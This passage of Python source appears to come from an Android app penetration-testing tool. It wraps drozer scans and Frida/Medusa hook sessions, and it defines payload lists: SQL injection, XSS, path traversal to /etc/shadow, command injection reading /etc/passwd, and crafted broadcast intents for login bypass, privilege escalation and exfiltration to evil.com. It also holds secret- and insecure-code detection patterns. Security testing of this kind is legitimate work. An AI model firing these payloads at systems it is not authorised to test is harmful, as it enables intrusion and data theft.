            steps.append({"step": "start_agent", "success": True, "detail": "Agent started"})

        _, err_fwd, rc_fwd = await _exec(
            [self.adb_path, "forward", "tcp:31415", "tcp:31415"]
        )
        fwd_ok = rc_fwd == 0
        steps.append({"step": "port_forward", "success": fwd_ok,
                       "detail": "tcp:31415 forwarded" if fwd_ok else f"Failed: {err_fwd}"})

        if progress_cb:
            await progress_cb("drozer", 80, "Waiting for agent server to start...")
        await asyncio.sleep(3)

        port_ok = await self._check_agent_port()
        if not port_ok:
            if progress_cb:
                await progress_cb("drozer", 85, "Server not yet listening, waiting longer...")
            await asyncio.sleep(5)
            port_ok = await self._check_agent_port()

        steps.append({
            "step": "server_listen", "success": port_ok,
            "detail": "Agent server listening on :31415" if port_ok
                      else "Agent server NOT listening – open the app and toggle Embedded Server ON"
        })

        conn_ok = False
        if cli_ok and fwd_ok and port_ok:
            if progress_cb:
                await progress_cb("drozer", 90, "Testing connection (retrying up to 3 times)...")
            conn_ok, conn_msg = await self._test_connection(retries=3)
            steps.append({"step": "connect", "success": conn_ok, "detail": conn_msg})
        elif cli_ok and fwd_ok:
            steps.append({"step": "connect", "success": False,
                           "detail": "Skipped: agent server not listening. "
                                     "Open drozer Agent app → toggle Embedded Server ON, then Connect."})
        else:
            steps.append({"step": "connect", "success": False,
                           "detail": "Skipped: CLI or port forward not ready"})

        if progress_cb:
            await progress_cb("drozer", 100, "Setup complete" if conn_ok else "Setup incomplete – see steps")

        return {"success": conn_ok, "steps": steps}

    async def _test_connection(self, retries: int = 3) -> tuple[bool, str]:
        last_err = ""
        for attempt in range(retries):
            out, err, rc = await _exec(
                ["drozer", "console", "connect",
                 "--server", "127.0.0.1:31415",
                 "-c", "run app.package.list"],
                timeout=25,
            )
            combined = out + err
            bad_markers = ["yayerroryay", "connectionerror", "refused", "no attribute"]
            if rc == 0 and combined.strip() and not any(m in combined.lower() for m in bad_markers):
                self._connected = True
                return True, "Connected to drozer Agent"
            last_err = combined[:300]
            if attempt < retries - 1:
                await asyncio.sleep(4)

        sock_ok = await self._check_agent_port()
        if not sock_ok:
            return False, (
                "drozer Agent server is not listening on port 31415. "
                "Open the drozer Agent app on the device and manually toggle "
                "'Embedded Server' to ON, then click Connect again."
            )
        return False, f"Connection failed after {retries} attempts: {last_err[:200]}"

    async def _check_agent_port(self) -> bool:
        """Check if the drozer agent port is reachable via the ADB forward."""
        import socket
        # Ensure the ADB forward exists
        await _exec([self.adb_path, "forward", "tcp:31415", "tcp:31415"], timeout=5)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect(("127.0.0.1", 31415))
            s.close()
            return True
        except (ConnectionRefusedError, OSError, socket.timeout):
            return False

    async def setup_connection(self) -> tuple[bool, str]:
        if not self.is_installed():
            return False, "drozer not installed. Use Setup to auto-install, or run: pip install drozer"

        _, err_fwd, rc_fwd = await _exec(
            [self.adb_path, "forward", "tcp:31415", "tcp:31415"]
        )
        if rc_fwd != 0:
            return False, f"ADB port forward failed: {err_fwd}"

        on_device = await self.is_agent_on_device()
        if not on_device:
            return False, (
                "drozer Agent not installed on device. Use the Setup button to auto-install, "
                "or install manually from: " + DROZER_AGENT_URL
            )

        port_ok = await self._check_agent_port()
        if not port_ok:
            await self.start_agent()
            await asyncio.sleep(3)
            port_ok = await self._check_agent_port()

        if not port_ok:
            return False, (
                "drozer Agent is installed but the embedded server is not running.\n"
                "Open the drozer Agent app on your device and toggle 'Embedded Server' to ON, "
                "then click Connect again."
            )

        return await self._test_connection(retries=3)

    async def run_module(self, module: str, package: str = "", extra_args: str = "") -> dict:
        if not self.is_installed():
            return {"success": False, "output": "drozer not installed", "findings": []}

        cmd_str = f"run {module}"
        if package:
            cmd_str += f" -a {package}"
        if extra_args:
            cmd_str += f" {extra_args}"

        out, err, rc = await _exec(
            ["drozer", "console", "connect",
             "--server", "127.0.0.1:31415",
             "-c", cmd_str], timeout=30,
        )
        output = out if out else err
        combined_lower = (out + err).lower()
        not_reachable = any(m in combined_lower for m in [
            "yayerroryay", "connectionerror", "refused", "drozer server",
            "no attribute", "not listening",
        ])
        if not_reachable:
            return {
                "success": False, "command": cmd_str,
                "output": (
                    "drozer Agent not reachable. Make sure the Embedded Server is ON "
                    "in the drozer Agent app, then run Setup or Connect first."
                ),
                "findings": [],
            }

        findings = self._parse_findings(module, output)
        return {"success": rc == 0, "command": cmd_str, "output": output, "findings": findings}

    def _parse_findings(self, module: str, output: str) -> list[dict]:
        findings = []
        lower_mod = module.lower()
        lower_out = output.lower()

        if "injection" in lower_mod and ("injection" in lower_out or "vulnerable" in lower_out):
            findings.append({
                "severity": "CRITICAL", "category": "SQL Injection",
                "title": f"SQL Injection found via {module}",
                "description": output[:500],
                "recommendation": "Use parameterized queries in ContentProviders",
            })
        if "traversal" in lower_mod and ("traversal" in lower_out or "vulnerable" in lower_out):
            findings.append({
                "severity": "HIGH", "category": "Path Traversal",
                "title": f"Path Traversal found via {module}",
                "description": output[:500],
                "recommendation": "Validate and sanitize file paths in ContentProviders",
            })
        if "attacksurface" in lower_mod:
            for line in output.splitlines():
                m = re.search(r"(\d+)\s+(activit|service|broadcast|provider)", line, re.I)
                if m and int(m.group(1)) > 0:
                    findings.append({
                        "severity": "MEDIUM", "category": "Attack Surface",
                        "title": f"Exported {m.group(2)}s: {m.group(1)}",
                        "description": line.strip(),
                    })
        if "activity.info" in lower_mod or "service.info" in lower_mod or "broadcast.info" in lower_mod:
            exported = [l.strip() for l in output.splitlines() if l.strip() and "Permission" not in l]
            if len(exported) > 3:
                comp_type = "activities" if "activity" in lower_mod else "services" if "service" in lower_mod else "receivers"
                findings.append({
                    "severity": "MEDIUM", "category": "Component Exposure",
                    "title": f"{len(exported)} {comp_type} enumerated",
                    "description": "\n".join(exported[:10]),
                })
        if "provider.info" in lower_mod:
            providers = [l.strip() for l in output.splitlines() if "content://" in l.lower() or "Authority" in l]
            if providers:
                findings.append({
                    "severity": "MEDIUM", "category": "Content Provider",
                    "title": f"{len(providers)} content providers found",
                    "description": "\n".join(providers[:10]),
                    "recommendation": "Verify providers are not leaking sensitive data",
                })
        if "browsable" in lower_mod:
            schemes = re.findall(r"(https?://[^\s]+|[a-z]+://[^\s]+)", output, re.I)
            if schemes:
                findings.append({
                    "severity": "MEDIUM", "category": "Deep Links",
                    "title": f"{len(schemes)} browsable URI(s) found",
                    "description": "\n".join(schemes[:10]),
                    "recommendation": "Validate deep link inputs; avoid exposing sensitive functionality",
                })

        return findings

    async def full_assessment(self, package: str, progress_cb: Optional[Callable] = None) -> list[dict]:
        modules = [
            "app.package.attacksurface", "app.package.info",
            "app.activity.info", "app.broadcast.info",
            "app.provider.info", "app.service.info",
            "scanner.provider.injection", "scanner.provider.traversal",
            "scanner.activity.browsable",
        ]
        results = []
        for i, mod in enumerate(modules):
            if progress_cb:
                await progress_cb("drozer", int((i / len(modules)) * 100), f"Running {mod}...")
            r = await self.run_module(mod, package)
            results.append(r)
            if not r["success"] and "not reachable" in r.get("output", ""):
                break
        return results


# ──────────────────────────────────────────────
# MEDUSA – Dynamic Analysis Hooks (per wiki)
# ──────────────────────────────────────────────
class MedusaAgent:
    """Deep integration with Medusa dynamic analysis framework.
    Follows the official workflow: stash modules → compile → run session."""

    def __init__(self):
        self.medusa_dir = str(MEDUSA_DIR)
        self.modules_dir = os.path.join(self.medusa_dir, "modules")
        self.snippets_dir = os.path.join(self.medusa_dir, "snippets")
        self.staged: list[dict] = []
        self._compiled_script: str = ""

    def is_available(self) -> bool:
        return os.path.isdir(self.medusa_dir)

    def _parse_med(self, path: str) -> Optional[dict]:
        """Parse a .med file (handles newlines/control chars in JSON strings)."""
        try:
            with open(path, "r", errors="replace") as f:
                raw = f.read()
            decoder = json.JSONDecoder(strict=False)
            data, _ = decoder.raw_decode(raw)
            return {
                "Name": data.get("Name", ""),
                "Description": data.get("Description", ""),
                "Help": data.get("Help", ""),
                "Code": data.get("Code", ""),
                "Options": data.get("Options"),
            }
        except Exception:
            return None

    def list_modules(self) -> list[dict]:
        modules = []
        if not os.path.isdir(self.modules_dir):
            return modules
        for root, dirs, files in os.walk(self.modules_dir):
            for f in files:
                if not f.endswith(".med"):
                    continue
                full_path = os.path.join(root, f)
                rel = os.path.relpath(full_path, self.modules_dir)
                category = os.path.dirname(rel) or "general"
                parsed = self._parse_med(full_path)
                modules.append({
                    "name": f.replace(".med", ""),
                    "category": category,
                    "path": rel,
                    "description": (parsed.get("Description", "") if parsed else "")[:200],
                    "help": (parsed.get("Help", "") if parsed else "")[:300],
                })
        return sorted(modules, key=lambda x: (x["category"], x["name"]))

    def list_snippets(self) -> list[dict]:
        snippets = []
        if not os.path.isdir(self.snippets_dir):
            return snippets
        for f in sorted(os.listdir(self.snippets_dir)):
            if f.endswith(".js"):
                path = os.path.join(self.snippets_dir, f)
                with open(path, "r", errors="replace") as fp:
                    content = fp.read()
                snippets.append({
                    "name": f.replace(".js", ""),
                    "filename": f,
                    "content": content,
                    "lines": content.count("\n") + 1,
                })
        return snippets

    # ── STASH / UNSTASH (per wiki workflow) ──

    def stash(self, module_path: str) -> tuple[bool, str]:
        """Add a module to the staging list (like medusa `use` command)."""
        full_path = os.path.join(self.modules_dir, module_path)
        if not os.path.exists(full_path):
            return False, f"Module not found: {module_path}"
        if any(s["path"] == module_path for s in self.staged):
            return False, f"Already stashed: {module_path}"
        parsed = self._parse_med(full_path)
        if not parsed:
            return False, f"Failed to parse: {module_path}"
        self.staged.append({"path": module_path, **parsed})
        return True, f"Stashed: {parsed['Name']} ({len(self.staged)} total)"

    def unstash(self, module_path: str) -> tuple[bool, str]:
        """Remove a module from staging (like medusa `rem` command)."""
        before = len(self.staged)
        self.staged = [s for s in self.staged if s["path"] != module_path]
        return len(self.staged) < before, f"{before - len(self.staged)} removed"

    def get_staged(self) -> list[dict]:
        return [{"path": s["path"], "name": s["Name"], "desc": s["Description"][:80]} for s in self.staged]

    def reset_staged(self) -> None:
        self.staged.clear()
        self._compiled_script = ""

    # ── COMPILE (per wiki: concatenate all stashed module Code) ──

    def compile(self, scratchpad: str = "") -> tuple[bool, str]:
        """Compile stashed modules into a single Frida script."""
        if not self.staged:
            return False, "No modules stashed. Use 'stash' to add modules first."
        parts = []
        for mod in self.staged:
            parts.append(f"// ── {mod['Name']} ──\n{mod['Code']}")
        if scratchpad:
            parts.append(f"// ── Scratchpad ──\n{scratchpad}")
        self._compiled_script = "\n\n".join(parts)
        return True, self._compiled_script

    def get_compiled(self) -> str:
        return self._compiled_script

    # ── RUN (per wiki: frida -U -f package -l compiled.js) ──

    async def run_session(self, package: str, spawn: bool = True, timeout: int = 60) -> dict:
        """Run the compiled script against a package."""
        if not self._compiled_script:
            return {"success": False, "error": "No compiled script. Compile modules first."}
        if not shutil.which("frida"):
            return {"success": False, "error": "frida CLI not installed"}

        tmp = tempfile.NamedTemporaryFile(suffix=".js", delete=False, mode="w")
        tmp.write(self._compiled_script)
        tmp.close()

        try:
            serial = await _get_android_serial()
            cmd = ["frida"]
            cmd += ["-D", serial] if serial else ["-U"]
            if spawn:
                cmd += ["-f", package]
            else:
                cmd += ["-n", package]
            cmd += ["-l", tmp.name]

            out, err, rc = await _exec(cmd, timeout=timeout)
            return {
                "success": rc == 0 or "Spawned" in out or len(out) > 20,
                "output": out[:5000] if out else "(session ended)",
                "error": err[:500] if rc != 0 and "error" in err.lower() else "",
                "modules_count": len(self.staged),
            }
        finally:
            try:
                os.unlink(tmp.name)
            except OSError:
                pass

    # ── SINGLE MODULE (quick run without stashing) ──

    async def compile_module(self, module_path: str) -> tuple[bool, str]:
        """Read a single .med module and return its Frida JS code."""
        full_path = os.path.join(self.modules_dir, module_path)
        if not os.path.exists(full_path):
            snip = os.path.join(self.snippets_dir, module_path)
            if os.path.exists(snip):
                with open(snip, "r", errors="replace") as f:
                    return True, f.read()
            return False, f"Module not found: {module_path}"
        parsed = self._parse_med(full_path)
        if parsed and parsed["Code"]:
            return True, parsed["Code"]
        return False, "Failed to extract Code from module"

    async def run_module_on_package(self, module_path: str, package: str, timeout: int = 60) -> dict:
        """Quick-run a single module on a package (without stash workflow)."""
        success, script = await self.compile_module(module_path)
        if not success:
            return {"success": False, "error": script}
        if not shutil.which("frida"):
            return {"success": False, "error": "frida CLI not installed"}

        tmp = tempfile.NamedTemporaryFile(suffix=".js", delete=False, mode="w")
        tmp.write(script)
        tmp.close()

        try:
            serial = await _get_android_serial()
            cmd = ["frida"]
            cmd += ["-D", serial] if serial else ["-U"]
            cmd += ["-f", package, "-l", tmp.name]
            out, err, rc = await _exec(cmd, timeout=timeout)
            return {
                "success": rc == 0 or "Spawned" in out or len(out) > 20,
                "output": out[:5000] if out else "(session ended)",
                "error": err[:500] if rc != 0 and "error" in err.lower() else "",
                "script_preview": script[:500],
            }
        finally:
            try:
                os.unlink(tmp.name)
            except OSError:
                pass


# ──────────────────────────────────────────────
# ANDROHUNTER – Comprehensive Security Testing
# ──────────────────────────────────────────────
PAYLOAD_ENGINE = {
    "sqli": [
        "'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
        "1 UNION SELECT null,null--", "' AND SLEEP(5)--", "admin'--", '" OR ""="',
    ],
    "xss": [
        "<script>alert(1)</script>", '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)", "'><svg onload=alert(1)>",
        "49", "{{7*7}}",
    ],
    "lfi": [
        "../../../etc/passwd", "../../../../etc/shadow",
        "..%2F..%2F..%2Fetc%2Fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd", "/etc/passwd%00",
    ],
    "redirect": [
        "https://evil.com", "//evil.com", "javascript:alert(1)",
        "https://evil.com%2F@target.com", "/\\/evil.com", "/%09/evil.com",
    ],
    "template": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "{{self._dict_}}",
    ],
    "cmdi": [
        "; id", "| id", "` id`", "$(id)",
        "; cat /etc/passwd", "| cat /etc/passwd", "&& id", "|| id",
    ],
    "idor": [
        "0", "1", "2", "100", "9999", "-1", "null", "undefined",
        "00000000-0000-0000-0000-000000000001",
    ],
}

INTENT_PAYLOADS = [
    {"name": "path_traversal_db", "data": "file:///data/data/{pkg}/databases/", "category": "LFI"},
    {"name": "path_traversal_hosts", "data": "file:///etc/hosts", "category": "LFI"},
    {"name": "path_traversal_prefs", "data": "file:///data/data/{pkg}/shared_prefs/", "category": "LFI"},
    {"name": "content_traversal", "data": "content://{pkg}.fileprovider/../../../../etc/hosts", "category": "LFI"},
    {"name": "javascript_xss", "data": "javascript://evil.com/%0aalert(1)", "category": "XSS"},
    {"name": "xss_script", "extras": {"data": "<script>alert(1)</script>", "input": '"><img src=x onerror=alert(1)>'}, "category": "XSS"},
    {"name": "deeplink_redirect", "data": "https://evil.com@legit.com/callback", "category": "Redirect"},
    {"name": "open_redirect", "data": "//evil.com", "category": "Redirect"},
    {"name": "sqli_basic", "extras": {"query": "' OR 1=1--", "search": "' UNION SELECT null,null--"}, "category": "SQLi"},
    {"name": "sqli_drop", "extras": {"query": "'; DROP TABLE users--", "input": "admin'--"}, "category": "SQLi"},
    {"name": "template_inject", "extras": {"data": "{{7*7}}", "input": "${7*7}"}, "category": "Template"},
    {"name": "cmdi_basic", "extras": {"cmd": "; id", "data": "$(cat /etc/passwd)"}, "category": "CmdI"},
]

BROADCAST_PAYLOADS = [
    {"name": "login_bypass", "action": "android.intent.action.BOOT_COMPLETED",
     "extras": {"authenticated": "true", "user_id": "1", "admin": "true"}, "category": "Auth", "severity": "HIGH"},
    {"name": "session_hijack", "action": "{pkg}.SESSION_UPDATE",
     "extras": {"session_id": "admin_session_12345", "role": "admin"}, "category": "Auth", "severity": "HIGH"},
    {"name": "sqli_via_extra", "action": "{pkg}.DATA_SYNC",
     "extras": {"query": "' OR 1=1--", "user": "admin'--"}, "category": "SQLi", "severity": "CRITICAL"},
    {"name": "sqli_union", "action": "{pkg}.SEARCH",
     "extras": {"keyword": "' UNION SELECT null,null--", "filter": "1 OR 1=1"}, "category": "SQLi", "severity": "CRITICAL"},
    {"name": "path_traversal", "action": "{pkg}.FILE_OPEN",
     "extras": {"path": "../../../data/data/{pkg}/databases/", "file": "../../../../etc/passwd"}, "category": "LFI", "severity": "HIGH"},
    {"name": "open_redirect", "action": "{pkg}.OPEN_URL",
     "extras": {"url": "javascript:alert(1)", "redirect": "https://evil.com"}, "category": "Redirect", "severity": "MEDIUM"},
    {"name": "deeplink_hijack", "action": "android.intent.action.VIEW",
     "extras": {"data": "file:///data/data/{pkg}/shared_prefs/"}, "category": "Redirect", "severity": "HIGH"},
    {"name": "privilege_escalation", "action": "{pkg}.ADMIN_ACTION",
     "extras": {"action": "grant_admin", "target_uid": "0"}, "category": "PrivEsc", "severity": "CRITICAL"},
    {"name": "component_enable", "action": "{pkg}.TOGGLE_COMPONENT",
     "extras": {"component": "{pkg}.HiddenActivity", "enabled": "true"}, "category": "PrivEsc", "severity": "HIGH"},
    {"name": "data_exfil", "action": "{pkg}.BACKUP",
     "extras": {"destination": "http://evil.com/collect", "include_prefs": "true"}, "category": "Exfil", "severity": "HIGH"},
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1' UNION SELECT null,null,null--",
    "1' UNION SELECT sql FROM sqlite_master--",
    "'; DROP TABLE test;--",
    "1 AND 1=2 UNION SELECT 1,group_concat(name),3 FROM sqlite_master--",
    "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)--",
    "' OR ''='",
    "1' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
]

DEX_SECRET_PATTERNS = {
    "API Key / Token": (r'(?i)(api_key|apikey|access_token|auth_token)[=:\s"\']+ *[A-Za-z0-9_\-]{16,}', "VULN"),
    "Bearer Token": (r'(?i)(bearer)[=:\s"\']+ *[A-Za-z0-9_\-.]{20,}', "VULN"),
    "AWS Access Key": (r"AKIA[0-9A-Z]{16}", "VULN"),
    "AWS Secret Key": (r'(?i)aws[_\-]?secret[_\-]?access[_\-]?key\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})', "VULN"),
    "Google API Key": (r"AIza[0-9A-Za-z_-]{35}", "VULN"),
    "Firebase URL": (r"https://[a-z0-9\-]+\.firebaseio\.com", "SUSP"),
    "Private Key": (r"-----BEGIN\s(?:RSA\s|EC\s|DSA\s|OPENSSH\s)?PRIVATE\sKEY-----", "VULN"),
    "Hardcoded Password": (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\'\n]{6,})["\']', "VULN"),
    "Hardcoded Crypto Key": (r'(?i)(?:secret[_\s]?key|encryption[_\s]?key|aes[_\s]?key|crypto[_\s]?key|(?:private|symmetric)[_\s]?key)\s*[=:]\s*["\']([^"\']{8,})["\']', "VULN"),
    "Hardcoded Key String": (r'(?i)(?:This is the (?:super )?secret|my secret key|encrypt(?:ion)? key|master key|private key)[^"\n]{0,40}', "VULN"),
    "Developer Backdoor Account": (r'\b(?:devadmin|testadmin|backdoor|debuguser|rootuser|masterkey)\b', "VULN"),
    "Generic API Key": (r'(?i)(?:api[_\-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})["\']', "SUSP"),
    "Generic Token": (r'(?i)(?:token|secret)\s*[=:]\s*["\']([^\s"\']{8,})["\']', "SUSP"),
    "Hardcoded URL with Credentials": (r"https?://[^\s:]+:[^\s@]+@[^\s]+", "VULN"),
    "JWT Token": (r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "VULN"),
    "Base64 Encoded Secret": (r'(?i)(?:secret|key|token)\s*=\s*"([A-Za-z0-9+/]{40,}={0,2})"', "SUSP"),
    "GitHub Token": (r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}", "VULN"),
    "Slack Token": (r"xox[bpors]-[0-9]{10,}-[0-9a-zA-Z-]+", "VULN"),
    "HTTP Endpoint": (r"https?://[a-zA-Z0-9./_\-?=&%:]{15,}", "INFO"),
    "Internal IP Address": (r"(?:192\.168\.|10\.|172\.1[6-9]\.)\d+\.\d+(?::\d+)?", "SUSP"),
    "Debug Flag": (r'(?i)(?:debug|staging|dev)[_\-]?(?:mode|url|host)[=:\s"\']+ *true', "SUSP"),
    "SQL Query": (r"SELECT .{1,50} FROM ", "INFO"),
}

# Code-level vulnerability patterns for DEX deep scanning (detects insecure API usage)
DEX_CODE_PATTERNS = {
    "WebView JavaScript Enabled": {
        "pattern": r"setJavaScriptEnabled",
        "severity": "HIGH",
        "category": "Insecure WebView",
        "title": "WebView JavaScript enabled",
        "description": "JavaScript enabled in WebView allows XSS attacks, especially when loading untrusted content",
        "recommendation": "Disable JavaScript in WebView or validate all loaded content",
    },
    "WebView SaveFormData": {
        "pattern": r"setSaveFormData",
        "severity": "MEDIUM",
        "category": "Insecure WebView",
        "title": "WebView saves form data",
        "description": "WebView stores form data including sensitive inputs",
        "recommendation": "Disable setSaveFormData for WebViews handling sensitive data",
    },
    "WebView File Access": {
        "pattern": r"setAllowFileAccess(?:FromFileURLs)?|setAllowUniversalAccessFromFileURLs",
        "severity": "HIGH",
        "category": "Insecure WebView",
        "title": "WebView file access enabled",
        "description": "WebView can access local file system, enabling data theft",
        "recommendation": "Disable file access in WebView settings",
    },
    "MODE_WORLD_READABLE": {
        "pattern": r"MODE_WORLD_READABLE|getSharedPreferences\([^,]+,\s*1\s*\)",
        "severity": "CRITICAL",
        "category": "Insecure Data Storage",
        "title": "World-readable SharedPreferences",
        "description": "SharedPreferences created with MODE_WORLD_READABLE (1) — any app on the device can read stored data",
        "recommendation": "Use MODE_PRIVATE (0) for SharedPreferences. Use EncryptedSharedPreferences for sensitive data.",
    },
    "MODE_WORLD_WRITEABLE": {
        "pattern": r"MODE_WORLD_WRITEABLE|getSharedPreferences\([^,]+,\s*2\s*\)",
        "severity": "CRITICAL",
        "category": "Insecure Data Storage",
        "title": "World-writeable SharedPreferences",
        "description": "SharedPreferences created with MODE_WORLD_WRITEABLE (2) — any app can modify stored data",
        "recommendation": "Use MODE_PRIVATE (0) for SharedPreferences",
    },
    "External Storage Write": {
        "pattern": r"getExternalStorageDirectory|getExternalFilesDir|EXTERNAL_STORAGE",
        "severity": "MEDIUM",
        "category": "Insecure Data Storage",
        "title": "Data written to external storage",
        "description": "External storage is world-readable; sensitive data may be exposed to other apps",
        "recommendation": "Use internal storage (getFilesDir) for sensitive data",
    },
    "Logging Sensitive Data": {
        "pattern": r'Log\.[dviewe]\([^)]*(?:password|passwd|token|secret|credential|session|key)[^)]*\)',
        "severity": "HIGH",
        "category": "Information Leakage",
        "title": "Sensitive data in Log calls",
        "description": "Logging sensitive information (password, token, secret) to logcat where other apps can read it",
        "recommendation": "Remove sensitive logging in production builds. Use ProGuard to strip Log calls.",
    },
    "Log Sensitive Login": {
        "pattern": r'Successful Login:|password is:|phonenumber:|newpassword=',
        "severity": "HIGH",
        "category": "Information Leakage",
        "title": "Sensitive data in log strings",
        "description": "Log messages containing credentials or personal data appear in logcat",
        "recommendation": "Remove sensitive logging from production builds",
    },
    "System.out with Sensitive Data": {
        "pattern": r'System\.out\.println\([^)]*(?:password|passwd|newpass|token|secret|credential|phoneno|phone)[^)]*\)',
        "severity": "HIGH",
        "category": "Information Leakage",
        "title": "Sensitive data in System.out.println",
        "description": "Printing sensitive data to standard output which appears in logcat",
        "recommendation": "Remove debug println statements from production code",
    },
    "Implicit Broadcast": {
        "pattern": r"sendBroadcast(?!Sync)",
        "severity": "HIGH",
        "category": "Insecure IPC",
        "title": "Implicit broadcast detected",
        "description": "sendBroadcast without permission or LocalBroadcastManager allows any app to intercept the data",
        "recommendation": "Use LocalBroadcastManager or specify permissions in sendBroadcast",
    },
    "SMS Send": {
        "pattern": r"sendTextMessage|SmsManager",
        "severity": "HIGH",
        "category": "Insecure Communication",
        "title": "SMS messaging detected",
        "description": "App sends SMS which may contain sensitive data and is unencrypted",
        "recommendation": "Avoid sending sensitive data via SMS. Use encrypted channels.",
    },
    "DefaultHttpClient (Deprecated)": {
        "pattern": r"DefaultHttpClient|BasicHttpParams|AllowAllHostnameVerifier",
        "severity": "HIGH",
        "category": "Insecure Communication",
        "title": "Deprecated HTTP client without cert validation",
        "description": "DefaultHttpClient is deprecated and lacks proper certificate validation. Vulnerable to MITM.",
        "recommendation": "Use HttpsURLConnection or OkHttp with proper TLS configuration",
    },
    "Zero/Static IV": {
        "pattern": r"IvParameterSpec\(\s*(?:new\s+byte\[\]\s*\{(?:\s*0\s*,?\s*){4,})|ivBytes\s*=\s*\{(?:\s*0\s*,?\s*){4,}|IvParameterSpec",
        "severity": "HIGH",
        "category": "Weak Cryptography",
        "title": "Static/zero initialization vector (IV)",
        "description": "Using a static or all-zeros IV with CBC mode defeats the purpose of the IV and enables pattern analysis",
        "recommendation": "Generate a random IV for each encryption operation using SecureRandom",
    },
    "ECB Mode": {
        "pattern": r'AES/ECB|Cipher\.getInstance\(\s*"AES"\s*\)',
        "severity": "HIGH",
        "category": "Weak Cryptography",
        "title": "ECB mode or bare AES cipher",
        "description": "ECB mode does not use an IV and produces identical ciphertext for identical plaintext blocks",
        "recommendation": "Use AES/GCM/NoPadding or AES/CBC/PKCS5Padding with a random IV",
    },
    "Hardcoded IV": {
        "pattern": r'IvParameterSpec\(\s*"[^"]+"\s*\.getBytes',
        "severity": "HIGH",
        "category": "Weak Cryptography",
        "title": "Hardcoded initialization vector",
        "description": "IV is derived from a hardcoded string, making encryption predictable",
        "recommendation": "Generate a random IV using SecureRandom for each encryption",
    },
    "Insecure Random": {
        "pattern": r"java\.util\.Random\b",
        "severity": "MEDIUM",
        "category": "Weak Cryptography",
        "title": "java.util.Random used (not cryptographically secure)",
        "description": "java.util.Random is predictable and unsuitable for cryptographic operations",
        "recommendation": "Use java.security.SecureRandom for cryptographic purposes",
    },
    "TrustAllCertificates": {
        "pattern": r"X509TrustManager|ALLOW_ALL_HOSTNAME_VERIFIER|TrustAllSSL|NullTrustManager|checkServerTrusted",
        "severity": "CRITICAL",
        "category": "Insecure Communication",
        "title": "Certificate validation disabled",
        "description": "SSL/TLS certificate validation is bypassed, enabling MITM attacks",
        "recommendation": "Implement proper certificate validation or use certificate pinning",
    },
    "Clipboard Data": {
        "pattern": r"ClipboardManager|setPrimaryClip",
        "severity": "MEDIUM",
        "category": "Information Leakage",
        "title": "Clipboard access detected",
        "description": "Data placed on clipboard is accessible to all apps",
        "recommendation": "Avoid placing sensitive data on clipboard; clear clipboard after use",
    },
    "SQL Raw Query": {
        "pattern": r'rawQuery\(\s*["\'][^"\']*\+|execSQL\(\s*["\'][^"\']*\+',
        "severity": "HIGH",
        "category": "SQL Injection",
        "title": "SQL query with string concatenation",
        "description": "Building SQL queries via string concatenation enables SQL injection",
        "recommendation": "Use parameterized queries with selectionArgs",
    },
    "Developer Backdoor": {
        "pattern": r'(?:equals|equalsIgnoreCase)\(\s*"(?:admin|devadmin|testuser|backdoor|debug|root|superuser|master)"',
        "severity": "CRITICAL",
        "category": "Developer Backdoor",
        "title": "Hardcoded privileged account check",
        "description": "Code checks for hardcoded admin/dev username, indicating a possible backdoor",
        "recommendation": "Remove all developer backdoor accounts from production builds",
    },
    "Base64 Credential Encoding": {
        "pattern": r'Base64\.(?:encode|decode).*(?:password|username|credential|token|secret)|EncryptedUsername|superSecurePassword',
        "severity": "HIGH",
        "category": "Weak Cryptography",
        "title": "Base64 used for credential encoding (not encryption)",
        "description": "Base64 is encoding, not encryption. Credentials can be trivially decoded.",
        "recommendation": "Use proper encryption (AES-GCM) with securely stored keys for sensitive data",
    },
    "HTTP Protocol": {
        "pattern": r'(?:protocol|scheme|url|endpoint|server|host)\s*=\s*"http://',
        "severity": "HIGH",
        "category": "Insecure Communication",
        "title": "Hardcoded HTTP (non-TLS) protocol",
        "description": "App uses plaintext HTTP instead of HTTPS, enabling network interception",
        "recommendation": "Use HTTPS for all server communication",
    },
    "Path Traversal via Intent": {
        "pattern": r'getStringExtra\([^)]*\).*(?:new\s+File|loadUrl|openFile|FileWriter|FileReader|FileInputStream|getExternalStorage)',
        "severity": "HIGH",
        "category": "Path Traversal",
        "title": "Unsanitized Intent extra used in file path",
        "description": "User-controlled string from Intent extras is used directly in file operations without sanitization, enabling directory traversal",
        "recommendation": "Sanitize file paths: reject ../ sequences, null bytes; use File.getCanonicalPath() and verify prefix",
    },
    "Unsanitized File Path": {
        "pattern": r'(?:getExternalStorageDirectory|getFilesDir|getCacheDir)\(\)[^;]*\+[^;]*(?:uname|username|user|name|param|extra)',
        "severity": "HIGH",
        "category": "Path Traversal",
        "title": "User-controlled value in file path construction",
        "description": "File path built by concatenating user-controlled input (username/parameter) — path traversal risk",
        "recommendation": "Validate filename characters, reject path separators and ../ sequences",
    },
    "Weak Root Detection": {
        "pattern": r'(?:Superuser\.apk|/system/xbin/which.*su|/system/bin/su|doesSUexist|doesSuperuserApkExist|isDeviceRooted)',
        "severity": "MEDIUM",
        "category": "Weak Protection",
        "title": "Basic root detection (easily bypassed)",
        "description": "Root detection relies on simple file/binary checks that can be bypassed with Frida or by hiding root",
        "recommendation": "Use SafetyNet/Play Integrity API; implement multi-layered detection with integrity checks at multiple app lifecycle points",
    },
    "Password Change No Old Password": {
        "pattern": r'(?:BasicNameValuePair|putExtra|put)\(\s*"(?:newpassword|new_password)"',
        "severity": "HIGH",
        "category": "Authentication Flaw",
        "title": "Password change without requiring old password",
        "description": "Password change sends only the new password to the server — no old/current password verification, allowing unauthorized password reset",
        "recommendation": "Always require the current password server-side before allowing password changes",
    },
    "Patchable Auth Flag": {
